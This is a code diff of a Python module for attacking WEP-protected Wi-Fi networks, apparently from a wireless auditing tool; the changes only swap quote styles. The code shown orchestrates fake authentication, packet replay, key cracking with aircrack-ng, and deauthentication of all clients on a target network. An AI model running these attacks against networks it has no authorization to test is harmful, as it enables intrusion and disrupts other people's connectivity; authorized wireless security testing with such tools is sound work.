@@ -69,7 +69,7 @@ class AttackWEP(Attack):
                         # Use our interface's MAC address for the attacks.
                         client_mac = Ifconfig.get_mac(Configuration.interface)
                         # Keep us authenticated
-                        fakeauth_proc = Aireplay(self.target, "fakeauth")
+                        fakeauth_proc = Aireplay(self.target, 'fakeauth')
                     elif len(airodump_target.clients) == 0:
                         # Failed to fakeauth, can't use our MAC.
                         # And there are no associated clients. Use one and tell the user.
@@ -108,16 +108,16 @@ class AttackWEP(Attack):
                         current_ivs = airodump_target.ivs
                         total_ivs = previous_ivs + current_ivs
 
-                        status = "%d/{C}%d{W} IVs" % (total_ivs, Configuration.wep_crack_at_ivs)
+                        status = '%d/{C}%d{W} IVs' % (total_ivs, Configuration.wep_crack_at_ivs)
                         if fakeauth_proc:
                             if fakeauth_proc and fakeauth_proc.status:
-                                status += ", {G}fakeauth{W}"
+                                status += ', {G}fakeauth{W}'
                             else:
-                                status += ", {R}no-auth{W}"
+                                status += ', {R}no-auth{W}'
                         if aireplay.status is not None:
-                            status += ", %s" % aireplay.status
+                            status += ', %s' % aireplay.status
                         Color.clear_entire_line()
-                        Color.pattack("WEP", airodump_target, "%s" % attack_name, status)
+                        Color.pattack('WEP', airodump_target, '%s' % attack_name, status)
 
                         # Check if we cracked it.
                         if aircrack and aircrack.is_cracked():
@@ -141,7 +141,7 @@ class AttackWEP(Attack):
 
                         if aircrack and aircrack.is_running():
                             # Aircrack is running in the background.
-                            Color.p("and {C}cracking{W}")
+                            Color.p('and {C}cracking{W}')
 
                         # Check number of IVs, crack if necessary
                         if total_ivs > Configuration.wep_crack_at_ivs:
@@ -180,7 +180,7 @@ class AttackWEP(Attack):
                                     # If .xor is not there, the process failed.
                                     Color.pl('\n{!} {O}%s attack{R} did not generate a .xor file' % attack_name)
                                     # XXX: For debugging
-                                    Color.pl('{?} {O}Command: {R}%s{W}' % " ".join(aireplay.cmd))
+                                    Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
                                     Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
                                     break
 
@@ -193,8 +193,8 @@ class AttackWEP(Attack):
                                 if replay_file:
                                     Color.pl('{+} {C}forged packet{W},' +
                                              ' {G}replaying...{W}')
-                                    wep_attack_type = WEPAttackType("forgedreplay")
-                                    attack_name = "forgedreplay"
+                                    wep_attack_type = WEPAttackType('forgedreplay')
+                                    attack_name = 'forgedreplay'
                                     aireplay = Aireplay(self.target,
                                                         'forgedreplay',
                                                         client_mac=client_mac,
@@ -206,7 +206,7 @@ class AttackWEP(Attack):
                                     break
                             else:
                                 Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
-                                Color.pl('{?} {O}Command: {R}%s{W}' % " ".join(aireplay.cmd))
+                                Color.pl('{?} {O}Command: {R}%s{W}' % ' '.join(aireplay.cmd))
                                 Color.pl('{?} {O}Output:\n{R}%s{W}' % aireplay.get_output())
                                 break # Continue to other attacks
 
@@ -268,29 +268,29 @@ class AttackWEP(Attack):
         or if we should stop attacking this target (returns True).
         '''
         if target is None:
-            Color.pl("")
+            Color.pl('')
             return True
         target_name = target.essid if target.essid_known else target.bssid
 
-        Color.pl("\n\n{!} {O}Interrupted")
-        Color.pl("{+} {W}Next steps:")
+        Color.pl('\n\n{!} {O}Interrupted')
+        Color.pl('{+} {W}Next steps:')
 
         # Deauth clients & retry
         attack_index = 1
-        Color.pl("     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}" % (current_attack, target_name))
+        Color.pl('     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}' % (current_attack, target_name))
 
         # Move onto a different WEP attack
         for attack_name in attacks_remaining:
             attack_index += 1
-            Color.pl("     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}" % (attack_index, attack_name, target_name))
+            Color.pl('     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}' % (attack_index, attack_name, target_name))
 
         # Stop attacking entirely
         attack_index += 1
-        Color.pl("     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}" % attack_index)
+        Color.pl('     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}' % attack_index)
         while True:
-            answer = raw_input(Color.s("{?} Select an option ({G}1-%d{W}): " % attack_index))
+            answer = raw_input(Color.s('{?} Select an option ({G}1-%d{W}): ' % attack_index))
             if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
-                Color.pl("{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}" % attack_index)
+                Color.pl('{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}' % attack_index)
                 continue
             answer = int(answer)
             break
@@ -300,7 +300,7 @@ class AttackWEP(Attack):
             deauth_count = 1
             Color.clear_entire_line()
 
-            Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
+            Color.p('\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...')
             Aireplay.deauth(target.bssid, essid=target.essid)
 
             attacking_mac = Ifconfig.get_mac(Configuration.interface)
@@ -309,13 +309,13 @@ class AttackWEP(Attack):
                     continue  # Don't deauth ourselves.
 
                 Color.clear_entire_line()
-                Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.station)
+                Color.p('\r{+} {O}Deauthenticating client {C}%s{W}...' % client.station)
 
                 Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                 deauth_count += 1
 
             Color.clear_entire_line()
-            Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % deauth_count)
+            Color.pl('\r{+} Sent {C}%d {O}deauths{W}' % deauth_count)
 
             # Re-insert current attack to top of list of attacks remaining
             attacks_remaining.insert(0, current_attack)
@@ -357,7 +357,7 @@ class AttackWEP(Attack):
 if __name__ == '__main__':
     Configuration.initialize(True)
     from ..model.target import Target
-    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
+    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
     target = Target(fields)
     wep = AttackWEP(target)
     wep.run()
